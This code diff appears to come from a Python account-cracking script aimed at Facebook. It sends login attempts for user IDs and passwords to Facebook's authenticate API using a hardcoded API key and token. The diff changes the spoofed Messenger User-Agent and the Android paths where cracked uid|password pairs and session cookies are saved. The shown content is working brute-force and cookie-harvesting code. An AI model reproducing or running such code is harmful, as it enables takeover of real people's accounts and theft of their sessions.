@@ -447,7 +447,7 @@ def randm(ids,psd):
             'fb_api_req_friendly_name':'authenticate',
             'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
             'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-            head={'User-Agent': '[Mozilla/5.0 (Linux; Android 11; SM-G991B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36]',
+            head={'User-Agent': '[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
             'Accept-Encoding':'gzip, deflate',
             'Connection':'close',
             'Content-Type':'application/x-www-form-urlencoded',
@@ -473,8 +473,8 @@ def randm(ids,psd):
                 coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                 print(f'\r\r{G1} [NXD-OK] {uid} | {pas}')
                 print(f'\r\r{G1}[🍪] Cookies - {A} {coki}')
-                open('/sdcard/NXD-NAZIM/RNDM-OK.txt','a').write(uid+'|'+pas+'\n')
-                open('/sdcard/NXD-NAZIM/RNDM-COOKIE.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
+                open('/storage/emulated/0/NXD-NAZIM/RNDM-OK.txt','a').write(uid+'|'+pas+'\n')
+                open('/storage/emulated/0/NXD-NAZIM/RNDM-COOKIE.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                 ok.append(uid)
                 break
             else:continue
